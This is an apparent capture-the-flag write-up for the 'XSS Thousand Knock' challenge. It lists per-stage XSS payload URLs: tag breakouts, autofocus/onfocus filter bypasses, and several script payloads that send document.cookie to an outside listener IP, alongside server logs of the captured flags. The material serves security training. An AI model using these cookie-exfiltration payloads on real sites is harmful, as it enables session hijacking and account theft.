# XSS_Thousand_Knock_Write_up

# Stage 1 (Tutorial)- Set up VPS/VPN, I used my AWS Shadowsock VPN in this case, and I created a python to listen flag coming through my VPN server
	- Example: *http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?location=%22http://example.com/?%22%2Bdocument.cookie*

	----> location="http://example.com/?"+document.cookie
	+ Main Payload:
		- <script>location=%22http://54.250.29.21:5000/?%22%2Bdocument.cookie</script>
		- javascript:location.href=`http://54.250.29.21:5000/?=`+document.cookie
	- 133.130.88.37 - - [23/Apr/2018 21:13:08] "GET /?flag=FLAG{waiwai_xss} HTTP/1.1" 200 - Flag is:FLAG{c1a43cdd6c2d3d4a082fe9351bce65f5917ca940}
# Stage 2
  -	http://1a31198b4289ff3af4f7195a810c48eba9f6bf28.knock.xss.moe/?q=%22%3E%3Cscript%3Elocation=%22http://YOUR VPN:5000/?%22%2Bdocument.cookie%3C/script%3E
	- 133.130.88.37 - - [23/Apr/2018 21:37:28] "GET /?flag=FLAG{c1a43cdd6c2d3d4a082fe9351bce65f5917ca940} HTTP/1.1" 200 -

# Stage 3
	Same as Stage 2
  - 133.130.88.37 - - [23/Apr/2018 22:05:37] "GET /?flag=FLAG{0041c8c9789deee9280396eb923d5b4ea8e887b2} HTTP/1.1" 200 -
# Stage 4
	- you need to bypass the <a> by </a> first, then implement XSS attack
	e1f80fe2ec262a235d594fbcee96dba66710.knock.xss.moe/?q='</a>"><script>alert(3)</script>
  - 133.130.88.37 - - [23/Apr/2018 22:11:58] "GET /?flag=FLAG{b8ab462f4ee4aa10f1f0eadb16383f1a596f3ec2} HTTP/1.1" 200 -

# Stage 5
 -	Similar as Stage 4, you need to bypass textarea in this time
	133.130.88.37 - - [23/Apr/2018 22:17:54] "GET /?flag=FLAG{57a968be0c6c0ba1dbc8a222488358366fda4edf} HTTP/1.1" 200 -

# Stage 6
 	- Similar, but you need to bypass XMP tag
	- 133.130.88.37 - - [23/Apr/2018 22:20:40] "GET /?flag=FLAG{66cd945a9de10077c24fc13b0834eec04a16df0c} HTTP/1.1" 200 -

# Stage 7
	- You need to bypass WAF by using onfocus autofocus tag
	- 133.130.88.37 - - [24/Apr/2018 01:21:48] "GET /?flag=FLAG{73fd502659f04529e689fa1e4782bc2f5ebbcea0} HTTP/1.1" 200 -
# Stage 8
	- still using autofocus focus tag, bypass ''
	- http://b65797d44372ecb2b2552e32f10ec75f1bddcca6.knock.xss.moe/?q=test123%27%20autofocus%20onfocus=%27alert(1)
	- 133.130.88.37 - - [24/Apr/2018 01:40:34] "GET /?flag=FLAG{7afa4218c3c89a4f47bdfc09aa6ba54f5b411183} HTTP/1.1" 200 -
# Stage 9
	- Still using autofocus onfocus tag bypass ""
	- http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=123%20%22/%3E%20autofocus%20%20onfocus=alert(1)
	-
# Stage 10
	- use javascript fake code
	- http://811fbf0db9c40565743a37c2978f812b82eb89a6.knock.xss.moe/?q=javascript:location.href=`http://54.250.29.21:5000/?=`+document.cookie
	- 133.130.88.37 - - [24/Apr/2018 01:50:57] "GET /?flag=FLAG{be6675878b462751acb240fdd1422c2ec4c963cd} HTTP/1.1" 200 -
